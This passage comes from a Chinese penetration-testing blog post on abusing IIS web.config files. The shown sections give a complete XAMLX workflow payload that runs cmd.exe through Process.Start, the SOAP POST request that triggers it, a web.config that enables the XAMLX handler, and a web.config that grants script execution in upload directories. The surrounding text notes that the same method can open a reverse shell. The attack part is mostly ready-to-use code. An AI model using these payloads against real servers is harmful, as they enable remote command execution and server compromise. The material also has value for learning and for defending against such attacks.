+<h3 id="（七）使用web-config启用-XAMLX来getshell"><a href="#（七）使用web-config启用-XAMLX来getshell" class="headerlink" title="（七）使用web.config启用 XAMLX来getshell"></a>（七）使用web.config启用 XAMLX来getshell</h3><p>XAMLX文件一般用于工作流服务，使用消息活动来发送和接收Windows Communication Foundation（WCF）消息的工作流。而我们可以使用该文件进行命令执行，一般有两种方法，一种是反序列化，另一种就是其本身的文件浏览功能在浏览上传的文件时，执行命令。以第二种为例，代码内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;WorkflowService ConfigurationName=&quot;Service1&quot; Name=&quot;Service1&quot; xmlns=&quot;http://schemas.microsoft.com/netfx/2009/xaml/servicemodel&quot; xmlns:p=&quot;http://schemas.microsoft.com/netfx/2009/xaml/activities&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:p1=&quot;http://schemas.microsoft.com/netfx/2009/xaml/activities&quot; &gt;</span><br><span class="line"> &lt;p:Sequence DisplayName=&quot;Sequential Service&quot;&gt;</span><br><span class="line"> &lt;TransactedReceiveScope Request=&quot;&#123;x:Reference __r0&#125;&quot;&gt;</span><br><span class="line"> &lt;p1:Sequence &gt;</span><br><span class="line"> &lt;SendReply DisplayName=&quot;SendResponse&quot; &gt;</span><br><span class="line"> &lt;SendReply.Request&gt;</span><br><span class="line"> &lt;Receive x:Name=&quot;__r0&quot; CanCreateInstance=&quot;True&quot; OperationName=&quot;SubmitPurchasingProposal&quot; Action=&quot;testme&quot; /&gt;</span><br><span class="line"> &lt;/SendReply.Request&gt;</span><br><span class="line"> &lt;SendMessageContent&gt;</span><br><span class="line"> &lt;p1:InArgument x:TypeArguments=&quot;x:String&quot;&gt;[System.Diagnostics.Process.Start(&quot;cmd.exe&quot;, &quot;/c calc&quot;).toString()]&lt;/p1:InArgument&gt;</span><br><span class="line"> &lt;/SendMessageContent&gt;</span><br><span class="line"> &lt;/SendReply&gt;</span><br><span class="line"> &lt;/p1:Sequence&gt;</span><br><span class="line"> &lt;/TransactedReceiveScope&gt;</span><br><span class="line"> &lt;/p:Sequence&gt;</span><br><span class="line">&lt;/WorkflowService&gt;</span><br></pre></td></tr></table></figure>
+<p>发送一个post请求即可调用该文件进行命令执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /uploaded.xamlx HTTP/1.1</span><br><span class="line">Host: 192.168.0.105</span><br><span class="line">SOAPAction: testme</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 94</span><br><span class="line"></span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;s:Body/&gt;&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gazd3o68gnj30ne0hcgn3.jpg" alt="截图_2020-01-17_10-43-08.png"></p>
+<p>所以我们也可以使用这种方法来进行反弹shell。</p>
+<p>但是该文件并非全部开启，若目标服务器启用了ＷCＦ服务我们可以使用下面的web.config进行启用这类文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line"> &lt;system.webServer&gt;</span><br><span class="line"> &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;</span><br><span class="line"> &lt;add name=&quot;xamlx&quot; path=&quot;*.xamlx&quot; verb=&quot;*&quot; type=&quot;System.Xaml.Hosting.XamlHttpHandlerFactory, System.Xaml.Hosting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; modules=&quot;ManagedPipelineHandler&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt;</span><br><span class="line"> &lt;add name=&quot;xamlx-Classic&quot; path=&quot;*.xamlx&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll&quot; requireAccess=&quot;Script&quot; preCondition=&quot;classicMode,runtimeVersionv4.0,bitness64&quot; /&gt;</span><br><span class="line"> &lt;/handlers&gt;</span><br><span class="line"> &lt;validation validateIntegratedModeConfiguration=&quot;false&quot; /&gt;</span><br><span class="line"> &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="（八）使用web-config绕过执行限制"><a href="#（八）使用web-config绕过执行限制" class="headerlink" title="（八）使用web.config绕过执行限制"></a>（八）使用web.config绕过执行限制</h3><p>在一个可读写的目录里无法执行脚本, 可以通过上传特殊的 web.config 文件突破限制.<br>比如这种：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gazeiwbzxcj30nc0ctt98.jpg" alt="截图_2020-01-17_11-32-25.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;handlers accessPolicy=&quot;Read, Write, Execute, Script&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>上传后即可访问、运行代码。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gazel5weltj30r10g574r.jpg" alt="截图_2020-01-17_11-34-36.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了这些还有像存储型xss、json攻击等因为各类限制较多，本人没有在文中指出，有兴趣的可以自行了解。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/webconf/">web.config在渗透中的作用</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年01月21日 - 21:01</p>
+  <p><span>最后更新:</span>2020年01月21日 - 21:01</p>
+  <p><span>原始链接:</span><a href="/webconf/" title="web.config在渗透中的作用">https://lengjibo.github.io/webconf/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/webconf/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/mysqlc/" rel="next" title="Mysql Client 任意文件读取攻击链拓展">
+                <i class="fa fa-chevron-left"></i> Mysql Client 任意文件读取攻击链拓展
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Daftar Isi
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ikhtisar
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">74</span>
+                    <span class="site-state-item-name">posting</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">kategori</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">106</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体利用"><span class="nav-number">1.</span> <span class="nav-text">具体利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（一）使用web-config进行重定向钓鱼"><span class="nav-number">1.1.</span> <span class="nav-text">（一）使用web.config进行重定向钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（二）使用web-config进行xss"><span class="nav-number">1.2.</span> <span class="nav-text">（二）使用web.config进行xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（三）使用web-config运行asp代码"><span class="nav-number">1.3.</span> <span class="nav-text">（三）使用web.config运行asp代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（四）使用web-config绕过hidden-segments"><span class="nav-number">1.4.</span> <span class="nav-text">（四）使用web.config绕过hidden segments</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（五）使用web-config进行rce"><span class="nav-number">1.5.</span> <span class="nav-text">（五）使用web.config进行rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（六）使用系统秘钥来反序列化进行rce"><span class="nav-number">1.6.</span> <span class="nav-text">（六）使用系统秘钥来反序列化进行rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（七）使用web-config启用-XAMLX来getshell"><span class="nav-number">1.7.</span> <span class="nav-text">（七）使用web.config启用 XAMLX来getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（八）使用web-config绕过执行限制"><span class="nav-number">1.8.</span> <span class="nav-text">（八）使用web.config绕过执行限制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Tema – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
